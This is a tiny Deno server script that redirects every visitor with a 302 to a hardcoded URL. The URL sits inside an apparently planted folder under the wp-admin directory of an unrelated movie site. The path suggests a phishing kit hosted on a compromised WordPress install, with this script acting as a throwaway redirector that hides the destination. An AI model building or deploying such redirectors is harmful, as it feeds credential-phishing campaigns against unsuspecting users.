import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://moviesbyespresso.com/wp-admin/.clone_aveRwbqJ/Earthls/_+_==/", // Replace this with your actual link
    },
  });
});
